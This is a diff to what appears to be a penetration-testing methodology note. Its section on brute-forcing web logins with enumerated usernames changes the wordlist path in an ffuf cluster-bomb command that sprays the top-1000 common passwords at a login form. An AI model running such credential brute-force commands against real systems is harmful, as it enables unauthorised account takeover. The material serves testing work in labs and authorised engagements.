@@ -200,13 +200,13 @@ Route:
 
 ## 5. Enum-fed brute force
 
-Full password wordlist × target-enumerated usernames. Highest per-attempt P (no wasted guesses on non-existent users), highest time cost — fires last, from WAC sub-block 1.14 when `users_<host>.txt` is populated by [[Username Enumeration]] or IDOR.
+Full password wordlist × target-enumerated usernames. Highest per-attempt P (no wasted guesses on non-existent users), highest time cost.
 
 ⚠️ Precondition: `users_<host>.txt` contains one or more entries. If empty → this section does not fire → return to [[Web Attack Checksheet]]
 
 **ffuf cluster bomb (enumerated users × top-1000 passwords):**
 
-`ffuf -w users_<host>.txt:FUZZUSER -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt:FUZZPASS -mode clusterbomb -X POST -d '<login_username_field>=FUZZUSER&<login_password_field>=FUZZPASS<login_static_hidden_fields_appended>' -H 'Content-Type: application/x-www-form-urlencoded' <req_flags> -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_enum_<host>_<port>.json -of json`
+`ffuf -w users_<host>.txt:FUZZUSER -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt:FUZZPASS -mode clusterbomb -X POST -d '<login_username_field>=FUZZUSER&<login_password_field>=FUZZPASS<login_static_hidden_fields_appended>' -H 'Content-Type: application/x-www-form-urlencoded' <req_flags> -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_enum_<host>_<port>.json -of json`
 
 **nsr pass over enumerated users** (empty / same-as-user / reversed):
 
